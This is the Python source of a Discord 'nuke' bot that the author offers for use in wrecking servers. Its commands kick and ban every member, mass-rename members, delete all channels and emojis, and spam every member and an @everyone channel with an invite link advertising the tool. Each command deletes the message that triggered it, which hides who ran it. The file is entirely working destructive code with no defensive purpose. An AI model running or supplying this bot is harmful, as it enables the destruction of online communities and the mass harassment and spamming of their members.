from discord import embeds
from discord.ext import commands
import discord
import asyncio
from discord.ext.commands.core import has_permissions
from discord.ext.commands import CommandNotFound
from discord.ext.commands.errors import CommandInvokeError, CommandOnCooldown, MissingPermissions, MissingRequiredArgument, CommandNotFound
from discord.ext import tasks

intents = discord.Intents(messages=True, guilds=True, members=True)
bot = commands.AutoShardedBot(command_prefix='*', intents=intents) ## U CAN CHANGE PREFIX
bot.remove_command('help')

token = "" ## TOKEN HERE

DefaultColour = discord.Colour(0x0062ff) 
SuccessColour = discord.Colour(0x0ac200) 
ErrorColour = discord.Colour(0xff0000) 

##on ready event
@bot.event
async def on_ready():
    print(f"NukeBot : {bot.user}")
    print(f'Nukebot Made by SUPER#8523')
    print(f'--------------------------------------')
    print(f'*kall - Kicks all members in discord!') #
    print(f'*ball - Bans all members in discord!') #
    print(f'*rall [rename-to] - Renames all members in discord!') #
    print(f'*mall - Mass DM all members in discord!') #
    print(f'*deall - Deletes all emojis in discord!')
    print(f'*addc - Creates a bunch of channels!') #
    print(f'')
    print(f'')
    activity = discord.Game(name="um idk") ##CHANGE STATUS
    await bot.change_presence(status=discord.Status.online, activity=activity)

@bot.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(bot.get_all_members()):
        try:
            await guild.kick(member)
            print (f"[+] {member.name} has been kicked")
        except:
            pass
       

@bot.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(bot.get_all_members()):
        try:
            await guild.ban(member)
            print (f"[+] {member.name} has been banned")
        except:
            pass


@bot.command(pass_context=True)
async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(bot.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"[+] {member.name} has been renamed to {rename_to}")
        except:
            pass


@bot.command(pass_context=True)
async def mall(ctx):
    await ctx.message.delete()
    for member in list(bot.get_all_members()):
        await asyncio.sleep(0)
        try:
            await member.send(f"{ctx.guild.name}, JUST GOT NUKED! \nGET UR NUKER HERE **ITS FREE**: https://discord.gg/yDb3a8Hn")
            print (f"[+] {member.name} has been DM'd")
        except:
            pass

@bot.command(pass_context=True)
async def dall(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print ("[+] " + channel.name + " has been deleted")
        except:
            pass

@bot.command(pass_context=True)
async def deall(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"[+] {emoji.name} has been deleted")
        except:
            pass    

@bot.command(pass_context=True)
async def addc(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    channel = await guild.create_text_channel("lol nuked")
    await channel.send("@everyone -> GET UR NUKER HERE **ITS FREE**: https://discord.gg/yDb3a8Hn")
    print ("[+] Channel was created")


bot.run(token) 